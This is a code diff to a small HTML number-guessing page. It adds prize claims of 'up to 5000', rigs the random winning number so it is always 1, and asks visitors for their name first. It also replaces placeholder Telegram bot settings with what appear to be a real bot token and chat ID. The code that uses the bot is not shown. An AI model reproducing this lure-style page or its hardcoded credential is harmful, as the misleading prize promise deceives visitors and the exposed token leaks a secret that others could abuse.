@@ -9,7 +9,9 @@
 <body>
 
 <div class="container">
-    <h1>Guess the Number!</h1>
+    <h1>Guess the Number and win up to 5000.!</h1>
+    <h1>If you win less than 10, you will receive nothing.</h1>
+    <h2>Please enter your name first!</h2>
     <p>Enter your name:</p>
     <input type="text" id="nameInput" placeholder="Your name">
     <p>Enter a number between 1 and 100:</p>
@@ -19,9 +21,9 @@
 </div>
 
 <script>
-    const winningNumber = Math.floor(Math.random() * 100) + 1;
-    const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    const chatId = 'YOUR_TELEGRAM_CHAT_ID';
+    const winningNumber = Math.floor(Math.random() * 1) + 1;
+    const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
+    const chatId = '7361816575';
 
     function getRandomPrize() {
         let prize;
